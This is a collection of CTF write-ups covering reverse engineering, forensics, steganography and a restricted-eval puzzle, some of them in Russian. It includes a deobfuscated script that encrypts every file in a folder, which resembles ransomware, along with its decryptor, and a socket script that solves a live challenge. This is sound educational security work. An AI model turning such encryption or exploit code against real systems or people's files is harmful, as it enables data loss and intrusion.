        _dc106f884eda4c9088aaecc8823c404e = _9b5737cb2ddb4cafac4e8fa8db81fb4b._c4a58d87b0b64df2a3abb595be3d37bb
        _dc106f884eda4c9088aaecc8823c404e += _460dcfe1367b4351bfd11161e6afb4bc.pack('I', _c8ab51b417d843f8982ae6704e9764b7(_6449e9edd5ba4b9ea64dada85dbcb387._6ec0b5915a0a48fd83b697329bce98ee))
        for (_c8fbf93f39ad47f998a472579951b862, _c3ad4cbb5a414d71969e31820763cc6b) in _6449e9edd5ba4b9ea64dada85dbcb387._6ec0b5915a0a48fd83b697329bce98ee:
            _7337aa3caf7c4d9f855a7a241a9db8be(f'adding {_c8fbf93f39ad47f998a472579951b862._d585684e5ba04013a5b1da4d6f098aef}...')
            _dc106f884eda4c9088aaecc8823c404e += _c8fbf93f39ad47f998a472579951b862._b7fb031ea43143438b91cbe9a209b22b()
            _ee0d197c60d4402e857e4bb0bce49e1a = _c3ad4cbb5a414d71969e31820763cc6b._0631e8b42e7c454594b97b0ab0a16d24()
            _dc106f884eda4c9088aaecc8823c404e += _460dcfe1367b4351bfd11161e6afb4bc.pack('I', _c8ab51b417d843f8982ae6704e9764b7(_ee0d197c60d4402e857e4bb0bce49e1a))
            _dc106f884eda4c9088aaecc8823c404e += _ee0d197c60d4402e857e4bb0bce49e1a
        _7e4af007183a40d98f41b11fff9394e6.joinpath('archive').write_bytes(_dc106f884eda4c9088aaecc8823c404e)
        _6449e9edd5ba4b9ea64dada85dbcb387._923eb7b1bd0f40ad8bf244a1a91b729c._db89af45a2c6466882953dad123fb736(_7e4af007183a40d98f41b11fff9394e6)

class _66107a3f96fc4f8aaf770c066d3260a5():

    def __init__(_0f4524a33f86428aa78df802020a8b9c, _bf69dea98863468b9984d21805d771c1: 'pathlib.Path'):
        _0f4524a33f86428aa78df802020a8b9c._2cfdc10004bd4e92bf85d509a3cf81c7 = _fc2e6885d4f6459c9173119853a9b941.Path(_bf69dea98863468b9984d21805d771c1)

    def _07da762b35064c328590155ab1fd0e23(_cfe2e0234bfd4d03b952524ad3819bc6, _67d2b743ebdf41b6a5e9e85cc89f7243: 'bool'):
        _46242f7a91824139a258372061add7c6 = _348deb41107f440ea6e05f9eda40e243(_cfe2e0234bfd4d03b952524ad3819bc6._2cfdc10004bd4e92bf85d509a3cf81c7.glob('*'))
        if _67d2b743ebdf41b6a5e9e85cc89f7243:
            _46242f7a91824139a258372061add7c6 = _348deb41107f440ea6e05f9eda40e243(_cfe2e0234bfd4d03b952524ad3819bc6._2cfdc10004bd4e92bf85d509a3cf81c7.rglob('*'))
        return _348deb41107f440ea6e05f9eda40e243(_e6701fe56f97478aae26772cabfcd254((lambda _c63f5418b03440d884d4d86f2862f8e8: _c63f5418b03440d884d4d86f2862f8e8.is_file()), _46242f7a91824139a258372061add7c6))

def _dee6853e587a46fe89d055f4a7d4a54c():
    _3b71a2a6e9ae4d7f97fa125aa9fe2eae = _d80254fe3b7f406a91ec7ea2a813e6ee.ArgumentParser(description='')
    _3b71a2a6e9ae4d7f97fa125aa9fe2eae.add_argument('d')
    _3b71a2a6e9ae4d7f97fa125aa9fe2eae.add_argument('o')
    return _3b71a2a6e9ae4d7f97fa125aa9fe2eae.parse_args()

def _46a7c5c324234b988db190a6f5011912():
    _9020d73ce88149339a5c0db87f05b655 = _dee6853e587a46fe89d055f4a7d4a54c()
    _405a529ecd9e4156902881815fe5b115 = _9b5737cb2ddb4cafac4e8fa8db81fb4b()
    _2531f0349f41497dbf1ed7339b4c880b = _66107a3f96fc4f8aaf770c066d3260a5(_9020d73ce88149339a5c0db87f05b655.d)
    _1cf3273eea5e4642b24446463c8edb23 = _fc2e6885d4f6459c9173119853a9b941.Path(_9020d73ce88149339a5c0db87f05b655.o)
    for _f6cd3797fea24c06be091c077f687482 in _2531f0349f41497dbf1ed7339b4c880b._07da762b35064c328590155ab1fd0e23(_33186cdf76944c1d8b235829cede199b):
        _405a529ecd9e4156902881815fe5b115._5f8f129324e640809d01bddc294aaa1e(_f6cd3797fea24c06be091c077f687482)
    _1cf3273eea5e4642b24446463c8edb23.mkdir(parents=_33186cdf76944c1d8b235829cede199b, exist_ok=_33186cdf76944c1d8b235829cede199b)
    _405a529ecd9e4156902881815fe5b115._6d9fd80d4dd64ec79fcb9665c4c3d5d6(_1cf3273eea5e4642b24446463c8edb23)
if (_0725a4328dac4b608bca988314e49535 == '__main__'):
    _46a7c5c324234b988db190a6f5011912()
```

That looks scary. So, I need to understand what this code does to understand what are other 2 files. How to understand this script? Answer: I need to rename variables. I started with renaming back imports. For example `_4491ba09efd64d32a7c316a89ed23540` must be replaced with `os`, `_9c0223fbd33e432cad291e3626fa8375` - `uuid` and so on. After that I renamed back this section:

```Python
_d92c89d5c8e6480ab83f62d04ac6968e = zip
_2a054c268d044e6ab9b9ba49b0c99ac2 = vars
_efe18136e1d14a66b014f121b6cdc599 = type
_9013c61b775f4709917f60cfb4c4d0bd = tuple
_c78251a8b4ef4e5c975562404153eca2 = super
_05314ca66c8241329018829d41388221 = sum
_edce3f96a97f4268b7f758ebbee92e39 = str
_f1216e22142a40e6b2f2bef9bad97dc8 = staticmethod
...
```

Next step is the hardest. I need guess names of classed, functions and variables. Well, first of all here:

```Python
if (_0725a4328dac4b608bca988314e49535 == '__main__'):
    _46a7c5c324234b988db190a6f5011912()
```

function `_46a7c5c324234b988db190a6f5011912()` must be `main()`. I will not explain the whole process of recovering the script. Here is fully recovered script:

```Python
import os
import uuid
import zlib as zlib
import struct as struct
import random as random
import pathlib as pathlib
import argparse as argparse
import cryptography.hazmat.backends as backends
import cryptography.hazmat.primitives.ciphers as ciphers


zero_byte = bytes([0])
init_vector_length = 16
aes_key_length = 16
backend = backends.default_backend()


class Encryptor():

    def __init__(self):
        self.init_vector = os.urandom(init_vector_length)
        self.aes_key = os.urandom(aes_key_length)
        self.cipher = ciphers.Cipher(ciphers.algorithms.AES(self.aes_key), ciphers.modes.CBC(self.init_vector), backend=backend)

    def __str__(self):
        return f'[{self.init_vector.hex()}|{self.aes_key.hex()}]'

    def encrypt(self, text: 'bytes'):
        cipher_text = self.cipher.encryptor()
        return (cipher_text.update(text) + cipher_text.finalize())

    def get_params(self):
        params = list((self.init_vector + self.aes_key))
        params.reverse()
        return bytes(params)

def add_padding(compressed_data: 'bytes', module: 'int'):
    pad = (module - (len(compressed_data) % module))
    return (compressed_data + bytes(([pad] * pad)))

class File_Processor3():
    number_128 = 128
    number_16 = 16

    def __init__(self, file_stat: 'ArchiveEntry'):
        self.file_stat = file_stat
        self.encryptor = Encryptor()
        self.dictionary = {
        }

    def __str__(self):
        return f'[{self.file_stat.get_uuid}|{self.encryptor}]'

    def pack_keys(self):
        if (not self.dictionary):
            raise RuntimeError('Serializing key before data...')
        keys = self.file_stat.get_uuid.bytes
        keys += self.encryptor.get_params()
        keys += struct.pack('I', len(self.dictionary))
        for (block_i, block_j) in self.dictionary.items():
            keys += struct.pack('2I', block_i, block_j)
        return keys

    def encrypt(self):
        with self.file_stat.get_filename.open('rb') as file:
            data = file.read()
        data = add_padding(zlib.compress(data), File_Processor3.number_16)
        encrypted_data = add_padding(self.encryptor.encrypt(data), File_Processor3.number_128)
        blocks_count = (len(encrypted_data) // File_Processor3.number_128)
        shuffling = list(range(blocks_count))
        random.shuffle(shuffling)
        for (block_i, block_j) in zip(list(range(blocks_count)), shuffling):
            self.dictionary[block_i] = block_j
        blocks = [encrypted_data[(i * File_Processor3.number_128):((i + 1) * File_Processor3.number_128)] for i in range(blocks_count)]
        encrypted = bytes([])
        for i in range(blocks_count):
            encrypted += blocks[self.dictionary[i]]
        return encrypted

class File_Stat_Class():

    def __init__(self, file: 'pathlib.Path'):
        self.file = file
        self.random_uuid = uuid.uuid4()
        self.file_stat = file.stat()

    def __str__(self):
        return f'[{self.random_uuid}|{self.file}]'

    @property
    def get_uuid(self):
        return self.random_uuid

    @property
    def get_filename(self):
        return self.file

    @property
    def get_str(self):
        return str(self.file)

    @property
    def get_file_size(self):
        return self.file_stat.st_size

    @property
    def get_file_mode(self):
        return self.file_stat.st_mode

    @property
    def get_file_atime(self):
        return self.file_stat.st_atime

    @property
    def get_file_mtime(self):
        return self.file_stat.st_mtime

    @property
    def get_file_ctime(self):
        return self.file_stat.st_ctime

    def pack_stat(self):
        uuid_filename = (self.get_str.encode() + zero_byte)
        to_return = struct.pack('I', len(uuid_filename))
        to_return += uuid_filename
        to_return += self.get_uuid.bytes
        to_return += struct.pack('2I', self.get_file_size, self.get_file_mode)
        to_return += struct.pack('3d', self.get_file_atime, self.get_file_mtime, self.get_file_ctime)
        return to_return

class File_Processor2():
    lol_kstr_header = bytes([76, 48, 76, 75, 83, 84, 82, 0])

    def __init__(self):
        self.processors = []

    def process_file(self, file_stat: 'ArchiveEntry'):
        processor = File_Processor3(file_stat)
        print(processor)
        self.processors.append(processor)
        return processor

    def pack_keys(self, folder: 'pathlib.Path'):
        header = File_Processor2.lol_kstr_header
        header += struct.pack('I', len(self.processors))
        for i in self.processors:
            header += i.pack_keys()
        folder.joinpath('keystore').write_bytes(header)

class File_Processor1():
    lolarch_header = bytes([76, 48, 76, 65, 82, 67, 72, 0])
    max_file_size = (((0xd1e6024e//0x2cac1fd8+0xd516fdc5-0x2cac1fd8//0xd1e6024e+0x2cac1fd8//0xd1e6024e+0x00000400-0xd1e6024e//0x2cac1fd8-0xd516fdc5) * (0xce9939ce//0x65d2f2bb+0x2b7f2291-0x65d2f2bb//0xce9939ce+0x65d2f2bb//0xce9939ce+0x00000400-0xce9939ce//0x65d2f2bb-0x2b7f2291)) * (0xd2fd3a25//0xf0fc6a15+0x93f468d5-0xf0fc6a15//0xd2fd3a25+0xf0fc6a15//0xd2fd3a25+0x00000001-0xd2fd3a25//0xf0fc6a15-0x93f468d5))

    def __init__(self):
        self.list_of_files = []
        self.file_processor2 = File_Processor2()

    def process_file(self, file: 'pathlib.Path'):
        file_stat = File_Stat_Class(file)
        print(file_stat)
        if (file_stat.get_file_size > File_Processor1.max_file_size):
            raise RuntimeError(f'{file_stat.get_filename} size is above the limit ({File_Processor1.max_file_size})!')
        processor = self.file_processor2.process_file(file_stat)
        self.list_of_files.append((file_stat, processor))

    def result_making(self, folder: 'pathlib.Path'):
        header = File_Processor1.lolarch_header
        header += struct.pack('I', len(self.list_of_files))
        for (file_stat, processor) in self.list_of_files:
            print(f'adding {file_stat.get_filename}...')
            header += file_stat.pack_stat()
            processed_file = processor.encrypt()
            header += struct.pack('I', len(processed_file))
            header += processed_file
        folder.joinpath('archive').write_bytes(header)
        self.file_processor2.pack_keys(folder)

class Files_from_directory():

    def __init__(self, directory: 'pathlib.Path'):
        self.in_directory_path = pathlib.Path(directory)

    def get_files(self, recursive: 'bool'):
        dir_objects = list(self.in_directory_path.glob('*'))
        if recursive:
            dir_objects = list(self.in_directory_path.rglob('*'))
        return list(filter((lambda objects: objects.is_file()), dir_objects))

def get_args():
    args_parser = argparse.ArgumentParser(description='')
    args_parser.add_argument('d')
    args_parser.add_argument('o')
    return args_parser.parse_args()

def main():
    args = get_args()
    obj_File_Processor1 = File_Processor1()
    list_of_files = Files_from_directory(args.d)
    out_folder = pathlib.Path(args.o)
    for file in list_of_files.get_files(True):
        obj_File_Processor1.process_file(file)
    out_folder.mkdir(parents=True, exist_ok=True)
    obj_File_Processor1.result_making(out_folder)


if (__name__ == '__main__'):
    main()
```

So what does this script do?

1) The script requires 2 arguments to be passed to it (input and output folders).

2) All files from the input folder are being processed with 3 "processors" and are encrypted with AES in CBC mode.

3) Encrypted files' data being packed into single file "archive".

4) Keys for decrypting files are packed into another file "keystore".

Now I know that `a` file is an `archive` and `k` is `keystore`.

---

### Decrypting files

Next step of the solution is to decrypt files packed into the archive. To do that, I need to understand how this archive being packed. Analysis of the script gives me an archive file specification:

1) First 8 bytes of the archive is the header: `LOLARCH\x00`.

2) Next 4 bytes are the count of files packed in the archive: `10 00 00 00`. That's 16.

3) After that goes 16 sections of packed files, each consists of:
    1) 4 bytes of the filename length: `19 00 00 00`. That's 25.

    2) Filename: `tmp/88190c29ecd14c2c0171\x00`.

    3) 16 bytes of file's uuid: `4a a0 73 07 e0 2a 48 32 be 12 c8 42 db e3 98 68`.

    4) 4 bytes size of file: `47 00 00 00`. That's 71.

    5) 4 bytes mode of file: `b4 81 00 00`.

    6) 8 bytes `atime` timestamp of file: `89 1c 14 ca 62 2f d7 41`.

    7) 8 bytes `mtime` timestamp of file: `89 1c 14 ca 62 2f d7 41`.

    8) 8 bytes `ctime` timestamp of file: `89 1c 14 ca 62 2f d7 41`.

    9) 4 bytes of packed data of file: `80 00 00 00` = 128.

    10) After that goes file.

Keystore has following specification:

1) 8 bytes of the header: `LOLKSTR\x00`.

2) 4 bytes count of keys in the keystore: `10 00 00 00` = 16.

3) 16 sections of keys:
    1) 16 bytes uuid of file being encrypted with following key: `4a a0 73 07 e0 2a 48 32 be 12 c8 42 db e3 98 68`.

    2) 32 bytes of reversed concatenation of init_vector for CBC (16 bytes) and AES key (16 bytes): `aa 16 43 0e 3f 55 49 fb cf 30 93 65 5b 26 92 84 25 05 b8 f9 80 d6 2d 98 55 61 3e ad ac 8a be 7d`.

    3) 4 bytes for length of dictionary. Dictionary contains information of the blocks' permutations: `01 00 00 00`.

    4) Dictionary:
        1) 4 bytes for key: `00 00 00 00`.
        2) 4 bytes for value `00 00 00 00`.
    *file contains only 1 block.

Having file's specification I made the following script to extract file from the archive:

```Python
import struct
import cryptography.hazmat.primitives.ciphers as ciphers
import cryptography.hazmat.backends as backends
import zlib


def parse_archive():
	files = {}

	with open("archive", "rb") as f:
		archive = f.read()

	index = 0
	header = archive[index:index + 8]
	index = index + 8

	print(b"Header: " + header)

	files_count = struct.unpack("I", archive[index:index + 4])[0]
	index = index + 4

	print(b"Count of files: " + str(files_count).encode())
	print()

	for i in range(files_count):
	
		filename_length = struct.unpack("I", archive[index:index + 4])[0]
		index = index + 4
		print(b"Filename length: " + str(filename_length).encode())

		filename = archive[index:index + filename_length]
		index = index + filename_length
		print(b"Filename: " + filename)

		uuid = archive[index: index+16]
		files[uuid] = {}
		files[uuid]["name"] = filename
		index = index + 16
		print(b"UUID: " + uuid)

		file_stat = struct.unpack("2I", archive[index: index + 8])
		index = index + 8
		file_size = file_stat[0]
		files[uuid]["size"] = file_size
		filemode = file_stat[1]
		print(b"File size: " + str(file_size).encode())
		print(b"File mode: " + str(filemode).encode())

		time = struct.unpack("3d", archive[index: index + 24])
		index = index + 24

		atime = time[0]
		mtime = time[1]
		ctime = time[2]
		print(b"atime: " + str(atime).encode())
		print(b"mtime: " + str(mtime).encode())
		print(b"ctime: " + str(ctime).encode())

		file_length = struct.unpack("I", archive[index: index + 4])[0]
		index = index + 4
		print(b"File length: " + str(file_length).encode())

		file_data = archive[index: index + file_length]
		index = index + file_length
		#print(b"File data: ")
		#print(file_data)

		with open(f"file{i}", "wb") as f:
			f.write(file_data)
		files[uuid]["data"] = file_data
		print()
	return files

# Parsing keystore
def parse_keystore():

	keys = {}
	with open("keys", "rb") as f:
		keystore = f.read()

	index = 0
	keystore_header = keystore[index: index + 8]
	index = index + 8
	print(b"Keystore header: " + keystore_header)

	keys_count = struct.unpack("I", keystore[index: index + 4])[0]
	index = index + 4
	print(b"Count of keys in the keystore: " + str(keys_count).encode())
	print()

	for i in range(16):

		uuid = keystore[index: index + 16]
		keys[uuid] = {}
		index = index + 16
		print(b"UUID: " + uuid)

		params = list(keystore[index: index + 32])
		index = index + 32
		params.reverse()
		init_vector = bytes(params[0:16])
		key = bytes(params[16:])
		keys[uuid]["init_vector"] = init_vector
		keys[uuid]["key"] = key
		print(b"init_vector: " + init_vector)
		print(b"key: " + key)

		dictionary_length = struct.unpack("I", keystore[index: index + 4])[0]
		index = index + 4
		print(b"dictionary length: " + str(dictionary_length).encode())

		substitution_dict = {}
		print(b"Dictionary: ")
		for j in range(dictionary_length):
			subst = struct.unpack("2I", keystore[index: index + 8])
			index = index + 8
			block_i = subst[0]
			block_j = subst[1]
			substitution_dict[block_j] = block_i 
			print(b"    " + str(block_i).encode() + b" -> " + str(block_j).encode())
			
		keys[uuid]["dictionary"] = substitution_dict
		print()
	return keys


def unpad(data):
	last_byte = data[-1]
	if data[len(data)-last_byte:] == bytes([last_byte]*last_byte):
		data = data[:len(data)-last_byte]
	return data


def decrypt(files, keys):
	backend = backends.default_backend()
	k = 0
	for i in files.keys():
		data = files[i]["data"]
		blocks_count = len(data) // 128
		blocks = [data[i * 128: (i + 1) * 128] for i in range(blocks_count)]
		unshuffled = bytes([])
		for j in range(blocks_count):
			unshuffled += blocks[keys[i]["dictionary"][j]]
		unshuffled = unpad(unshuffled)
		cipher = ciphers.Cipher(ciphers.algorithms.AES(keys[i]["key"]), ciphers.modes.CBC(keys[i]["init_vector"]), backend=backend)
		decryptor = cipher.decryptor()
		unshuffled = decryptor.update(unshuffled)
		unshuffled = unpad(unshuffled)

		with open(f"{k}.txt", "wb") as f:
			f.write(zlib.decompress(unshuffled))
		k += 1


if __name__ == "__main__":
	files = parse_archive()
	keys = parse_keystore()
	decrypt(files, keys)

```

Running the script gave me 16 files, one of them contained the flag: `INSA{9c431db9206d2c13bd730a331f07561e49fdebb13ef13057bbeee655a6808fa5}`


### File: CTF-Writeups/Newbie CTF 2019/Chat/README.md

# Chat

## Task

![task](./src/task.png)

## Solution

Here I was given the archive with virtual machine with Windows 10. First, I tried to run it, but it is password protected. So I mounted the `NewbieCTF2019_KakaoTalk.vmdk` to my Linux VM and digged through files. Finally I found this folder.

![folder](./src/folder.png)

I looked into `login_list.dat` and found an email.

![email](./src/email.png)

And the flag is `KorNewbie{renek@it-simple.net}`


### File: CTF-Writeups/Newbie CTF 2019/Contact Point/README.md

# Contact point

## Task

![task](./src/task.png)

## Solution

Here I was given an android backup file [backup](./src/backup.ab). There is a tool ["abe"](./src/abe.jar) (aka "Android backup extractor"). So I used it and got the tar archive backup.tar.

![unpacking](./src/unpacking.png)

After unpacking the archive I got lots of folders of applications' data. In the folder 'com.android.browser' I found the database.

![database](./src/database.png)

Looking into the database I found the table with the browser's history and the flag.

![history](./src/history.png)

So the flag is `KorNewbie{Jeju_international_airport}`


### File: CTF-Writeups/Newbie CTF 2019/Find the plain/README.md

# Find the plain

## Task

![task](./src/task.png)

[vithim.pcapng](./src/vithim.pcapng)

## Solution

Here I have the network traffic dump. I loaded it to Wireshark and used filter `ftp || ftp-data` as for in the task was said that data was sent with FTP.

![filter](./src/filter.png)

Next, I followed the TCP stream and found the password.

![password](./src/password.png)

Now I need to find the data. So I looked at FTP-DATA packet.

![ftp-data](./src/ftp_data.png)

Here I see some Base64 encoded string. Decoding it...

![from_base](./src/from_base.png)

Got the URL.

![data](./src/data.png)

And now I have the data. But the system won't accept the flag `KorNewbie{root_k459iki6m5j094m2lmkhjmi9527l81ml}`. Seems like I did something wrong. Let's dig some deeper.

Looking at expert information I found this fascinating comment

![comment](./src/comment.png)

Ok, now I decrypt the data

![decrypt](./src/decrypt.png)

The flag must be `KorNewbie{root_d459bdb6f5c094f2efdacfb9527e81fe}`, although I can't check it because the CTF have been paused for a 15 hours by now =)

The flag is actually the cracked boss name concatenated with the ftp password `root`

![crack](./src/md5_cracked.png)

`KorNewbie{root_IronDragon`



### File: CTF-Writeups/Newbie CTF 2019/REC/README.md

# REC

## Task

![task](./src/task.png)

[REC](./src/REC.zip)

## Solution

After unpacking the archive I got a .exe file, but it is broken and won't be run by the system. So I looked at it's bytes and found out there was a broken header.

![hex](./src/hex.png)

I fixed it and it won't run anyway =)

So I just opened it in IDA and watched through functions. Finally I found the following code.

![ida](./src/ida.png)

The flag is `KorNewbie{Recover_Signature}`


### File: CTF-Writeups/Newbie CTF 2019/Top Secret/README.md

# Top Secret

## Task
![task](./src/task.png)

After downloading and unzipping the archive I got the file named "Windows 7 Enterprise K-b94208dd.vmem". Seems like it's a job for Volatility Framework. So let's get started.

## Solution

First of all, I determine the profile of the dump. Well, actually, first of all, I have renamed the file to 'dump'. Just to make the name shorter.

![imageinfo](./src/imageinfo.png)

Now that I know it's Win7SP1x86_23418, I can start to analyze the dump. Let's see the process list.

![pslist](./src/pslist.png)

There are two processes I am most interested in. They are chrome.exe and notepad.exe (although there are some other processes I could look at). First, I wanted to look at chrome's history.

![chromehistory](./src/chromehistory.png)

And here I found a few images, one of them is called flag.png. So that's must be something useful! But it's not, after looking at these images with stegsolve, exiftool and binwalk I found out these images are totally useless. So let's keep digging.

I decided to look at notepad.exe and dumped its memory. It took a while.

![memdump](./src/memdump.png)

Next, I fetched `strings` from dump and used `grep "KorNewbie"`

![flag](./src/flag.png)

The flag is `KorNewbie{OH..You_Know_B4sic_0F_M3mory_Forensics!}`


### File: CTF-Writeups/PrayganCTF 2019/Forensics/Welcome/README.md

# Welcome

## Таска

Do you think this is a normal image? No! Dig deeper to find out more.....

![welcome](https://raw.githubusercontent.com/0awawa0/CTF-Writeups/master/PrayganCTF%202019/Forensics/Welcome/welcome.jpeg)

## Решение

Такс, ну понятное дело, первым делом я загнал картинку в Stegsolve, но там ничего интересного не обнаружилось. Поэтому я решил взглянуть на неё в хексе. Вот там уже картинка повеселее:

![hexview](https://raw.githubusercontent.com/0awawa0/CTF-Writeups/master/PrayganCTF%202019/Forensics/Welcome/hexview.png)

Видим заголовок .zip архива. Аккуратно вырезаем архив и сохраняем в новом файлике. Распаковываем, а там еще один архив, ха. Распаковываем его тоже. А в нём... опять архив, но еще и secret.bmp.

![secret](https://raw.githubusercontent.com/0awawa0/CTF-Writeups/master/PrayganCTF%202019/Forensics/Welcome/secret.png)

Ну мы уж и не смотрим на секрет, а рвёмся распаковывать zip. А не тут-то было, архивчик-то запаролен:

![password](https://raw.githubusercontent.com/0awawa0/CTF-Writeups/master/PrayganCTF%202019/Forensics/Welcome/password.png)

Ну ладно, смотрим чё там в картинке:

![fail](https://raw.githubusercontent.com/0awawa0/CTF-Writeups/master/PrayganCTF%202019/Forensics/Welcome/fail.png)

Ой. Ясненько, смотрим хексы:

![what](https://raw.githubusercontent.com/0awawa0/CTF-Writeups/master/PrayganCTF%202019/Forensics/Welcome/what.png)

А это вообще не файл, каша какая-то. Но в конце есть кусочек подозрительно похожий на Base64. Декодируем, и:

![decode1](https://raw.githubusercontent.com/0awawa0/CTF-Writeups/master/PrayganCTF%202019/Forensics/Welcome/decode1.png)

Чё за... Так, спокойствие, а если убрать "==" с конца:

![decode2](https://raw.githubusercontent.com/0awawa0/CTF-Writeups/master/PrayganCTF%202019/Forensics/Welcome/decode2.png)

Во, а вот и пароль. Распаковываем архив и видим картинку:

![a](https://raw.githubusercontent.com/0awawa0/CTF-Writeups/master/PrayganCTF%202019/Forensics/Welcome/a.png)

Пихаем её сразу в Stegsolve и вуаля:

![HACKERMAN](https://raw.githubusercontent.com/0awawa0/CTF-Writeups/master/PrayganCTF%202019/Forensics/Welcome/HACKERMAN.png)



### File: CTF-Writeups/README.md

# CTF-Writeups

As I sometimes participate in different CTF and solve tasks I pick up some interesiting tasks and publish their solutions in this repository.

##

Now publishing writeups at https://0awawa0.medium.com/



### File: CTF-Writeups/RealCTF 2019/Magic Brackets/README.md

# Magic Brackets

## Task

![task](./src/task.PNG)

[app.py](./src/app.py)

## Solution

First, I looked at the source code of the application:

```Python
import random

print("Welcome, traveller!")
print("I have a task for you.")
print("I will give you some numbers.")
print("The only thing you have to do is send them back to me.")
print("If you do everything correctly, I will give you the flag.")
print("Sounds easy, right?")
print("However, to prove that you are the true bracket master, you can only use the following symbols: ()[]<>|")
print("Well here we go:")

for _ in range(100):
    num = random.randint(100, 100000)
    print(num)
    try:
        if num != eval("".join([c for c in input() if c in "()[]<>|"])):
            print("Sorry, that's wrong :c")
            exit(0)
    except:
        print("Ouch, that hurts :c")
        exit(0)
print("Good job!")
print("Your flag is [REDACTED]")
```

So, we need to enter the string, which contains only symbols from this list: `()[]<>|`. Okay. I was confused for a while. But after about an hour and a half I came up with this code:

```Python
>>> [()] > []
True
```

Ha, I made 1. But I need numbers in range 100..100000. Now I remembered about bit shifts. And here we go:

```Python
>>> ([()] > []) << ([()] > [])
2
```

Yeah! Now, shifting this, I can get any number 2<sup>n</sup>. And las thing left is to get any number `2 % n != 0`. Luckily, I can use `|`. So I can use it to make any uneven number:

```Python
>>> ([()] > []) << ([()] > []) | ([()] > [])
3
```

Using all these things I made this code to solve the task:

```Python
import socket


def to_brackets(number: int):
	bint = bin(number)[2:]
	one = "([()]>[])"
	result = one
	for bit in bint[1:]:
		if bit == "1":
			result = f"(({result}) << ({one})) | {one}"
		else:
			result = f"(({result}) << ({one}))"
	return result


def main():
	s = socket.socket()
	s.connect(("tasks.realctf.pro", 28392))
	print(s.recv(1024).decode())
	while 1:
		data = s.recv(1024).decode()
		print(data)
		try:
			num = int(data.strip())
			res = to_brackets(num) + "\n"
			print(res)
			s.send(res.encode())
		except:
			break
	print(to_brackets(543))


if __name__ == "__main__":
	main()
```

Run it and here we go:

![flag](./src/flag.PNG)

Flag: `HSE{8RrrR4cK3t_P0O0w3rrr}`



### File: CTF-Writeups/Sunshine CTF/MISC/Big Bad/README.md

# Big Bad

English version coming soon

## Task

![task](./src/task.png)

[BigBad](./src/BigBad.png)

## Solution

Открываем картинку:

![BigBad](./src/BigBad.png)

Тут какое-то дерево. Внимательно читая задание, замечаем слово HUFF. Похоже, нам намекают на [кодирование методом Хаффмана](https://en.wikipedia.org/wiki/Huffman_coding). Только у нас нет данных, которые надо декодировать.

Поискать эти данные я решил внутри картинки. Открываем её Stegsolve'ом и находим вот такую штуку:

![stegsolve](./src/stegsolve.png)

Так, на что это похоже? Может штрих-код? После некоторых несложных манипуляций я получил вот такую картинку:

![barcode](./src/barcode.png)

Здесь красные точки я поставил для того, чтобы было легче посчитать ширину линий. Теперь всё это переводим в нули и единицы следующим образом: 

1) Ширина самой тонкой линии берется за эталонную ширину одного символа.

2) Чёрные полоски - это 0, белые - это 1

То есть первая черная полоска будет равна 00000, потому что её ширина равна 5 эталонным. Далее идёт 1, потом 0 и т.д. Декодируя таким образом весь штрих-код получаем такую строку:

`0000010100101101000010011010001010100011010101001100101000101100110001110111111001100111011111000000111100010010110011001111101010001100011111011`

Теперь, используя дерево на картинке, декодируем флаг в соответствии с правилами [кодирования Хаффмана](https://en.wikipedia.org/wiki/Huffman_coding) и получаем следующую строку: `sun{sh0ulda_u5ed_br1cks_1001130519}`



### File: CTF-Writeups/UUTCTF 2019/Reverse/Break My Record/README.md

# Break My Record

## Task

![task](./src/task.png)

[Tale_Rang.apk](./src/Tale_Rang.apk)

## Solution

I didn't wanna to install this app, so I just decompiled it with jadx. There are a lot of files with code, but I didn't analyze all of it, I just watched it through in order to find something interesting. And here it is! In FourthActivity if found the following code:

![fourth_activity](./src/fourth_activity.png)

Seems like here your score compares to the best score. And if you scored more, base64 encoded flag will be printed.

Decoding the base:

![base](./src/base.png)

UUTCTF{7c34446d10bbb60d0cae15059fffc98d}


### File: CTF-Writeups/UUTCTF 2019/Reverse/CorrectPass/README.md

# CorrectPAss

## Task

![task](./src/task.png)

[pass](./src/pass)

## Solution

We are given some binary. I don't wanna run it, but I wanna watch what's inside. So let's throw it to IDA.

![ida_main](./src/ida_main.png)

What do we see? First, the program asks for input at line 10. After that the program checks if it's  being debugged. If it is, variable `v4` at line 15 will be 1, if it's not - 16. So we should not debug it. At line 15 the space for our input is being allocated, at line 16 it's filled with `0`. And at line 17 the program reads input from the stdin.

After that input goes through several checks, and if it passes all of them the programm will print the flag. Next I will analyze variables and functions and rename them just to make it easier to read the code.

Variables:

1) `v4` -> `input_length`
2) `s` -> `input`
3) `v0` -> as long as we know that input should be 16 symbols length, I can calculate the index 16 / 2 - 1 = 7. So I will rename it to `input_7`
4) `v1` -> `input_6`
5) `v2` -> `input_0`

Functions:

1) `sub_804858B`. Now let's watch it' source code:

![comparison](./src/comparison.png)

The function takes two attributes and compares them. If they are equal, function will return their value, else - 1. So I will call it `comparison`

2) `sub_80485EA`:

![length](./src/length.png)

This function is takes one argument, it should be some address because in the loop we see indexing. In the loop index is being incremented until the element in the memory not euqal `\n`. I suppose the idea of the function is to find the length of given string. So I call it `length`.

3) `sub_80485A2`:

![ret95](./src/ret95.png)

At this function I see that v1 equals to 18 and it returns 5 * (18 + 1 (or 400)). So it returns 95 or 39710. I will call it `ret95`.

4) `sub_8048623`:

![m36](./src/m36.png)

Here I see, that loop goes from 36 to 1, and given argument is being decreased by 1 or by 1094861568. I really don't think there will be 1094861568, so this function is actually made to calculate a1 - 35. So I name it `m36`.

Next 5 functions perform some checks for `input`, so I will call it `check1`, `check2`, `check3`, `check4` and `check5`.

Here how the code looks after refactoring:

![new_code](./src/new_code.png)

Now let's analyze `checks`. At line 18 length of the input is being checked for equality to 16. At line 21 I found out that 7th symbol of the input should be 95, so it's `_`. And symbol at index 2 must be 101 -> `e`. Great! Moving on.

At line 24 I can see that input at index 6 must be equals to symbol at index 2. That's `e`. At line 27 I discover that first symbol of input must be 101 - 36 - 1 = 64 -> `@`. Well, that doesn't seem right. Later I found out that I made mistake and function `m36` is actually calculates a1 - 35, so 101 - 35 - 1 = 65 -> `A`. That's better.

Function `check1`:

![check1](./src/check1.png)

We need this function to return 0. Now let's see what is going on here. First this function check if the length of input is equal to 16. It is, so it's fine. Next two operand reveals values of the input at indexes 11 and 12. Thats 33 -> `!`.

Function `check2`:

![check2](./src/check2.png)

Extreamly easy one! Here I see that input[3] must be 115 -> `s`, input[4] = 111 -> `o`, input[5] = 109 -> `m`.

Function `check3`:

![check3](./src/check3.png)

input[13] = 59 = `;`, input[14] = 45 = `-`, input[15] = 41 = `)`.

Function `check4`:

![check4](./src/check4.png)

